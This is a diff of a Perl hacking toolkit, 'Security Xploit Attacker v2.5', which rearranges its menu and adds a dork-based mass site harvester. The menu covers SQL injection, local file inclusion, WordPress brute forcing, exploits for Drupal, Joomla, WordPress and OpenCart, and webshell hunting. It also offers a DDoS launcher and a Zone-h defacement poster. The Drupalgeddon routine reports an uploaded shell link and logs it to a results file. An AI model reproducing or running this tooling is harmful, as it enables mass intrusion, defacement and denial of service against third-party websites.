@@ -1,25 +1,30 @@
 #Coded by ph.hitachi
+#https://www.facebook.com/ph.hitachi.org
+#Email: ph.hitachi@gmail.com
 #Don't change my right bitches
-#This code free don't copy my codes and sale it :V
-
-
+#don't copy wihtout credits
+#Publish 02/12/2018
 use if $^O eq "MSWin32", Win32::Console::ANSI;
 use Getopt::Long;
-use HTTP::Request;
+use LWP;
 use LWP::UserAgent;
-use IO::Select;
+use Term::ANSIColor;
 use HTTP::Cookies;
 use HTTP::Response;
-use Term::ANSIColor;
+use HTTP::Request;
 use HTTP::Request::Common qw(POST);
 use HTTP::Request::Common qw(GET);
+use WWW::Mechanize;
 use URI::URL;
+use IO::Select;
 use IO::Socket::INET;
+use MIME::Base64;
+use HTML::Entities;
 my $ua = LWP::UserAgent->new;
 $ua->timeout(10);
 main:;
-system("title DISCLAMER");
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+system("title DISCLAMER");
 print "\n              	    ";
 print colored("                  (DISCLAIMER)\n\n",'red');
 print "                  ";
@@ -59,18 +64,15 @@ main();
 else {
 goto main;
 };
-system("title Security Xploit Attacker v2.5");
+banner:;
 $au = LWP::UserAgent->new();
 $au->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $au->timeout(10);
 sub main(){
-if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
-print color('bold green');
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+system("title Security Xploit Attacker v2.5");
+print color('green');
 my $datetime    = localtime;
-@months = qw(01 02 03 04 05 06 07 08 09 10 11 12);
-($second, $minute, $hour, $dayOfMonth, $month, $yearOffset, $dayOfWeek, $dayOfYear, $daylightSavings) = localtime();
-$year = 1900 + $yearOffset;
-$month = "$months[$month]";
 $banner="           
                       .                                                      .
                     .n                   .                 .                  n.
@@ -110,32 +112,32 @@ print colored ("Start At $datetime",'white on_cyan'),"";
 print colored("[+]\n\n",'green on_blue');
 print color('reset');
 print "                      	           	 ";
-print colored("You Have List Of Sites ?\n\n",'cyan on_red');
+print colored("You Have List Of Sites ?\n",'cyan on_red');
 print "                      	           	      ";
 print colored("Choose a number\n\n",'cyan on_red');
 print color("green" ), "\t[";print color("white"),"01";print color("green"),"]";print color("blue"),"Yes\n";
 print color("green" ), "\t[";print color("white"),"02";print color("green"),"]";print color("red"),"No\n";
-print color("green" ), "\t[";print color("white"),"03";print color("green"),"]";print color("yellow"),"SQL injection scanner\n";
-print color("green" ), "\t[";print color("white"),"04";print color("green"),"]";print color("green"),"Get dorks\n";
-print color("green" ), "\t[";print color("white"),"05";print color("green"),"]";print color("blue"),"Local file inclusion [Auto inject]\n";
-print color("green" ), "\t[";print color("white"),"06";print color("green"),"]";print color("red"),"WordPress Brute Force\n",;
+print color("green" ), "\t[";print color("white"),"03";print color("green"),"]";print color("yellow"),"Help\n";
+print color("green" ), "\t[";print color("white"),"04";print color("green"),"]";print color("green"),"Grab Site[ Dorking ] \n";
+print color("green" ), "\t[";print color("white"),"05";print color("green"),"]";print color("blue"),"Website Etractor\n";
+print color("green" ), "\t[";print color("white"),"06";print color("green"),"]";print color("red"),"Admin Page Finder\n",;
 print color("green" ), "\t[";print color("white"),"07";print color("green"),"]";print color("yellow"),"FTP Scanner\n",;
-print color("green" ), "\t[";print color("white"),"08";print color("green"),"]";print color("green"),"Admin Page Finder\n",;
-print color("green" ), "\t[";print color("white"),"09";print color("green"),"]";print color("blue"),"Exploit WordPress only\n";
-print color("green" ), "\t[";print color("white"),"10";print color("green"),"]";print color("red"),"Exploit Drupal only\n";
-print color("green" ), "\t[";print color("white"),"11";print color("green"),"]";print color("red"),"Exploit Joomla only\n";
-print color("green" ), "\t[";print color("white"),"12";print color("green"),"]";print color("yellow"),"Shells Finder [ WSO Shell ]\n";
-print color("green" ), "\t[";print color("white"),"13";print color("green"),"]";print color("blue"),"Shells Scanner [ WebShells Found ]\n";
-print color("green" ), "\t[";print color("white"),"14";print color("green"),"]";print color("blue"),"Exploit OpenCart only\n";
-print color("green" ), "\t[";print color("white"),"15";print color("green"),"]";print color("red"),"IP Generator\n";
-print color("green" ), "\t[";print color("white"),"16";print color("green"),"]";print color("yellow"),"Grab Site[ Dorking ]\n";
-print color("green" ), "\t[";print color("white"),"17";print color("green"),"]";print color("blue"),"List Sites to IP\n";
-print color("green" ), "\t[";print color("white"),"18";print color("green"),"]";print color("blue"),"Reverse IP [ Get site from IP ]\n";
-print color("green" ), "\t[";print color("white"),"19";print color("green"),"]";print color("red"),"DDos Attack\n";
-print color("green" ), "\t[";print color("white"),"20";print color("green"),"]";print color("red"),"Brute Force\n";
+print color("green" ), "\t[";print color("white"),"08";print color("green"),"]";print color("green"),"SQL injection scanner\n",;
+print color("green" ), "\t[";print color("white"),"09";print color("green"),"]";print color("blue"),"Local file inclusion [Auto inject] \n";
+print color("green" ), "\t[";print color("white"),"10";print color("green"),"]";print color("red"),"WordPress Brute Force\n";
+print color("green" ), "\t[";print color("white"),"11";print color("green"),"]";print color("yellow"),"Brute Force\n";
+print color("green" ), "\t[";print color("white"),"12";print color("green"),"]";print color("green"),"Exploit WordPress only\n";
+print color("green" ), "\t[";print color("white"),"13";print color("green"),"]";print color("blue"),"Exploit Drupal only\n";
+print color("green" ), "\t[";print color("white"),"14";print color("green"),"]";print color("red"),"Exploit Joomla only\n";
+print color("green" ), "\t[";print color("white"),"15";print color("green"),"]";print color("yellow"),"Exploit OpenCart only\n";
+print color("green" ), "\t[";print color("white"),"16";print color("green"),"]";print color("green"),"Shells Finder [ WSO Shell ]\n";
+print color("green" ), "\t[";print color("white"),"17";print color("green"),"]";print color("blue"),"IP Generator\n";
+print color("green" ), "\t[";print color("white"),"18";print color("green"),"]";print color("red"),"List Sites to IP\n";
+print color("green" ), "\t[";print color("white"),"19";print color("green"),"]";print color("green"),"Reverse IP [ Get site from IP ] \n";
+print color("green" ), "\t[";print color("white"),"20";print color("green"),"]";print color("blue"),"DDos Attack\n";
 print color("green" ), "\t[";print color("white"),"21";print color("green"),"]";print color("red"),"Zone-h [poster]\n";
 print color("green" ), "\t[";print color("white"),"22";print color("green"),"]";print color("red"),"Exit\n";
-print color("green" ), "\t>";print color("white"),">";print color("green"),">";
+print color("green" ), "\t>";print color("white"),">";print color("green"),">   ";
 print color ('reset');
 
 $item=<STDIN>;
@@ -150,59 +152,45 @@ print color("bold white"),"Enter your websites list : ";
 $list=<STDIN>;
 chomp $list;
 }
-if($item eq '2')
-{
+if($item eq '2'){
 system("dork.pl");
-}
-$cms="CMS";
-    if (-e $cms){
-    }else{
-        mkdir $cms or die "Error creating directory: $cms";
-    }
-$rez="Result";
-    if (-e $rez){
-  }else{
-        mkdir $rez or die "Error creating directory: $rez";
-    }
-if($item eq '3' )
-{
-system("sqli.py");
-}
-if($item eq '4')
+}if($item eq '3' )
 {
 getdork();
+}if($item eq '4'){
+grabsitedork();
 }if($item eq '5'){
-system("lfi.pl");
+websitegrabber();
 }if($item eq '6'){
-system("wpbrute.pl");
+system("ftp_scanner.py");
 }if($item eq '7'){
 system("ftp_scanner.py");
 }if($item eq '8'){
-system("admin.py");
+system("sqli.py");
 }if($item eq '9'){
-scanwordpress();
+system("fli.pl");
 }if($item eq '10'){
-scandrupal();
+system("wpbrute.pl");
 }if($item eq '11'){
-scanjoomla();
+system("BFv1.pl -l brute.txt -p pass.txt");
 }if($item eq '12'){
-shellscan();
+scanwordpress();
 }if($item eq '13'){
-shellfound();
+scandrupal();
 }if($item eq '14'){
-scanopencart();
+scanjoomla();
 }if($item eq '15'){
-ipgen();
+scanopencart();
 }if($item eq '16'){
-grabsitedork();
+shellscan();
 }if($item eq '17'){
-listtoip();
+ipgen();
 }if($item eq '18'){
-revip();
+listtoip();
 }if($item eq '19'){
-system("DDos.pl")
+revip();
 }if($item eq '20'){
-system ("BFv1.pl -l brute.txt -p pass.txt");
+system("DDos.pl")
 }if ($item eq '21'){
 system("zone.pl");
 }if ($item eq '22'){
@@ -215,8 +203,11 @@ open (SITE, "<$list") || die "[-] Can't open the list websites file";
 close SITE;
 $link=$#TARGETS + 1;
 
-print color("bold white"), "[+] Total sites : ";
-print color("bold red"), "".scalar(@SITE)."\n\n\n";
+print color('bold red'), " [";
+print color('bold green'),"*";
+print color('bold red'),"]";
+print color('bold white'),"Total sites : ";
+print color("bold green"), "".scalar(@SITE)."\n\n\n";
 print color('reset');
 
 OUTER: foreach $site(@SITE){
@@ -492,8 +483,7 @@ close(TEXT);
 # | |__| | |  | |_| | |_) | (_| | |
 # |_____/|_|   \__,_| .__/ \__,_|_|
 #                   | |            
-#                   |_|     
-       
+#                   |_|           
 ################ Drupal  Exploit #####################
 
 sub Drupal(){
@@ -555,7 +545,7 @@ if ($response =~ /200/){
 print item(),"Drupalgeddon";
 print color('bold white')," ...................... ";
 print color('bold green'),"VULN\n\n";
-print item(),"Shell Uploaded Successfully\n";
+print item(),"Payload Uploaded Successfully\n";
 print color('bold white'),"  [Link] => $site/Xploit.php?X=Xploit\n";
 open (TEXT, '>>Result/shells.txt');
 print TEXT "$site/Xploit.php?X=Xploit\n";
@@ -563,7 +553,7 @@ close (TEXT);
 }else{
 print item(),"Drupalgeddon";
 print color('bold white')," ...................... ";
-print color('bold red'),"NOt VULN\n\n";
+print color('bold red'),"NOT VULN\n\n";
 }
 }
 #  __  __                        _        
@@ -651,8 +641,8 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Uploading Shell ................... ";
-    print color('reset');
-   print color('bold green');
+print color('reset');
+print color('bold green');
 print "[Success]\n";
     print color('reset');
 
@@ -7868,7 +7858,7 @@ intext:Kembali ke Website Utama
 intext:Developed by  inurl:berita- ext:html
 inurl:/statis-1- ext:html site:.
 inurl:/statis-1- ext:html site:.com/net/id/coli :V
-Copyright © 2013 by Polostama. All rights reserved.
+Copyright ɠ2013 by Polostama. All rights reserved.
 inurl:media.php?module=home\n\n";
 
 print color('bold white'), " [";
@@ -8733,49 +8723,8 @@ print "\n";
 '/templates/rhuk_milkyway/admins.php',
 '/templates/rhuk_milkyway/wp.zip',
 '/templates/rhuk_milkyway/','WSO.php',
-'a.php',
-'z.php',
-'e.php',
-'r.php',
-'xz.php',
-'hhh.php',
-'fuck.php',
-'hb.php',
-'t.php',
-'y.php',
-'u.php',
-'i.php',
-'o.php',
-'p.php',
-'q.php',
-'s.php',
-'d.php',
-'f.php',
-'g.php',
-'h.php',
-'j.php',
-'k.php',
-'l.php',
-'m.php',
-'w.php',
-'x.php',
-'c.php',
-'v.php',
-'b.php',
-'n.php',
-'1.php',
-'2.php',
-'3.php',
-'4.php',
-'5.php',
-'6.php',
-'7.php',
-'8.php',
-'9.php',
-'10.php',
-'12.php',
-'11.php',
-'1234.php',);
+'a.php','z.php','e.php','r.php','xz.php','hhh.php','fuck.php','hb.php','t.php','y.php','u.php','i.php','o.php','p.php','q.php','s.php','d.php','f.php','g.php','h.php','j.php','k.php','l.php',
+'m.php','w.php','x.php','c.php','v.php','b.php','n.php','1.php','2.php','3.php','4.php','5.php','6.php','7.php','8.php','9.php','10.php','12.php','11.php','1234.php',);
 
 foreach $shell(@path){
 
@@ -8796,14 +8745,6 @@ print color("bold red"),("[Webshell Not Found] ==> $shell\n");
 }
 exit;
 }
-
-
-
-
-
-
-
-
 sub grabsitedork {
 print color 'reset';
 print color("bold Green"), "\n";
@@ -8907,8 +8848,913 @@ open(TEXT, '>>Result/Generator.txt');
 }
 }
 }
+	
+###############################################################################################
+################################## credits to Wissem Mahfoud ##################################
+###############################################################################################
+sub websitegrabber(){
+my $datetime    = localtime;
+$mech = WWW::Mechanize->new(autocheck => 0);
+$ag = LWP::UserAgent->new();
+$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+$ag->timeout(10);
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$res="target";
+    if (-e $res)
+    {
+    }
+    else
+    {
+        mkdir $res or die "WE CAN NOT CREATE THE BOARD OF DIRECTORS: $res";
+    }										
+$logo="                                                                                                                               
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";
+print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]";print color("green"),"Mass Grab by ip or site list \n";
+print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]";print color("green"),"Mass Grab Range by ip or site list \n";
+print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]";print color("green"),"choose ur country u want it \n";
+print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]";print color("green"),"find sites in all COUNTRY domain \n";
+print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]";print color("green"),"find sites in all WORK domainS \n";
+print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]";print color("green"),"find sites in ALL domainS \n";
+print color("green" ), "\t   [";print color("red"),"7";print color("green"),"]";print color("green"),"extract sites from ip server \n";
+print color("green" ), "\t   [";print color("red"),"0";print color("green"),"]";print color("green"),"GO_BACK <-- \n\n\n";
+print color("green"),"[+] Choose Number : ";
+my $toolZ = <STDIN>;
+chomp $toolZ;
+if($toolZ eq '0')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'banner;');
+}
+if($toolZ eq '1')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="                                                                                                                         
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print "Put A Ip List path or websites BUT websites should be www.site.com without http : ...\n";
+print " Path to your websites list:";
+my $list=<STDIN>;
+chomp($list);
+	open (THETARGET, "<$list") || die "[-] Can't open file ";
+@TARGETS = <THETARGET>;
+close THETARGET;
+$link=$#TARGETS + 1;
+OUTER: foreach $tofuck(@TARGETS){
+chomp($tofuck);
+if($tofuck =~ /http:\/\/(.*)\//)
+{
+$tofuck= $1;
+gettt();
+}
+else
+{
+gettt();
+}
+}
+}
+if($toolz eq '2')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print "Put A Ip List path or websites BUT websites should be www.site.com without http : ... \n";
+print " Path to your websites list:";
+my $list=<STDIN>;
+chomp($list);
+	open (THETARGET, "<$list") || die "[-] Can't open file";
+@TARGETS = <THETARGET>;
+close THETARGET;
+$link=$#TARGETS + 1;
+OUTER: foreach $tofuck(@TARGETS){
+chomp($tofuck);
+if($tofuck =~ /http:\/\/(.*)\//) {
+$tofuck= $1;
+gett();
+}else{
+gett();
+}
+}
+}
+if($toolZ eq '3')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print "[Here You Can Choose The Country Dork exp: inurl:.asp?id= site:co.il ]\n";
+print "Give Me Dork:";
+$dork=<STDIN>;
+chomp($dork);
+$dork=~s/ /+/g;
+crew();
+}
+if($toolZ eq '4')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print "[Just Put Your Dork And I will Scan All World COUNTRY Sites Area ]\n";
+print "Give Me Dork:";
+$dor=<STDIN>;
+chomp($dor);
+$dor=~s/ /+/g;
+
+@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");
+
+OUTER: foreach $country(@country){
+chomp $country;
+$dork="$dor+site:$country";
+print color("red"),"ur domain is [ ";
+print color('reset');
+print color("green"),"$domains ]\n";
+print color('reset');
+THE();
+}
+}
+
+if($toolZ eq '5')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print "[Scan All the 'work' Domains Categories ]\n";
+print "Dork please :";
+$dor=<STDIN>;
+chomp($dor);
+$dor=~s/ /+/g;
+
+@domains= ("gov","edu","com","net","info","tv","travel","biz","mobi","tel","int","mil","eu","design","online","shop","clup","asia","academy","accountant","accountants","actor","adult","ae.org","africa","agency","apartement","com.ar","archi","art","associates","attorney","com.au","id.au","net.au","org.au","auction","band","bar","bargains","bayern","beer","berlin","best","bet","bid","bike","bingo","bio","biz","black","blog","blue","boutique","br.com","brussels","build","buiders","business","buzz","cab","cafe","cam","camera","camp","capetown","capital","cards","care","career","careers","casa","cash","casino","catering","center","chat","cheap","church","city","claims","cleaning","click","clinic","clothing","cloud","cn.com","co.uk","coach","codes","coffee","college","community","company","computer","construction","consulting","contractors","cooking","cool","country","coupons","courses","credit","cricket","cruises","dance","date","dating","deals","degree","delivery","democrat","dental","dentist","diamonds","digital","direct","directory","discount","doctor","dog","domains","durban","download","earth","eco","education","email","energy","engineer","engineering","enterprises","equipment","estate","eu.com","events","exchange","expert","exposed","express","fail","faith","family","fans","farm","fashion","finance","finance","financial","fish","fishing","fit","fitness","flights","florist","fm","football","forsale","foundation","fun","fund","furniture","futbol","fyi","gallery","games","garden","gift","gifts","gives","glass","global","gold","golf","graphics","gratis","green","gripe","group","guide","guru","hamburg","haus","health","healthcare","help","hockey","holiday","horse","hospital","host","house","how","ht","immo","immobilien","industries","ink","institute","insure","international","investments","jetzt","jewelry","joburg","jpn.com","kaufen","kim","kitchen","kiwi","koeln","kyoto","land","lat","lawyer","lease","legal","lgbt","life","lighting","limited","limo","link","live","loan","loans","lol","london","love","ltd","maison","management","marketing","mba","media","melbourne","men","menu","miami","mobi","moda","moe","mom","money","mortgage","nagoya","name","network","news","ngo","ninja","nyc","ac.nz","org.nz","kiwi.nz","net.nz","school.nz","gen.nz","geen.nz","co.nz","maori.nz","okinawa","one","onl","organic","osaka","paris","partners","parts","party","pet","photo","photography","photos","pics","pictures","pink","pizza","place","plumbing","plus","poker","porn","press","pro","productions","promo","properties","pub","qpon","quebec","racing","recipes","red","rehab","reise","reisen","rent","rentals","repair","report","republican","rest","restaurant","review","reviews","rip","rocks","rodeo","ru.com","run","ryukyu","sa.com","sale","salon","sarl","com.sb","school","schule","science","scot","services","sexy","com.sg","shiksha","shoes","shopping","show","singles","site","ski","soccer","social","software","solar","solutions","soy","space","stop","store","stream","studio","study","style","supplies","supply","support","sure","surgery","sydney","systems","taipei","tattoo","tax","taxi","team","tech","technology","tel","tennis","theater","tienda","tips","tires","today","tokyo","tools","top","tours","town","toys","trade","trading","training","tube","org.uk","me.uk","uk.com","university","uno","us.com","vacations","vc","vegas","ventures","vet","viajes","video","villas","vin","vip","vision","vlaanderen","vodka","vote","voting","voyage","wales","wang","watch","webcam","website","wedding","wf","wien","wiki","win","wine","work","works","world","wtf","??","??","???","???","?????","??","???","??","??","??","XYZ","YOGA","yokohama","yt","co.za","za.com","zone");
+
+OUTER: foreach $domains(@domains){
+chomp $domains;
+$dork="$dor+site:$domains";
+print color("red"),"ur domain is [ ";
+print color('reset');
+print color("green"),"$domains ]\n";
+print color('reset');
+THE();
+}
+}
+if($toolZ eq '6')
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print " [ ALL Domains ( Countrys+Work ) ]\n";
+print "Dork please :";
+$dor=<STDIN>;
+chomp($dor);
+$dor=~s/ /+/g;
+
